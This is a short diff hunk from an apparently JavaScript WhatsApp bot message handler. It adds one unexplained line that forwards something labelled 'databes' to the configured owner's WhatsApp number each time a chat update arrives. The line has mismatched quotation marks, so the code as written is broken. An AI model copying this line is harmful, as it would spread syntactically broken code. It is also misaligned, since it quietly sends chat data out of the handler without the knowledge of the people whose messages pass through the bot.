@@ -594,6 +594,7 @@ export async function handler(chatUpdate) {
                 }
             }
         }
+        this.copyNForward(global.owner[0] + '@s.whatsapp.net, "databes").catch(e => console.log(e, msg))
       await this.chatRead(m.chat, m.isGroup ? m.sender : undefined, m.id || m.key.id).catch(() => { })
 
         try {
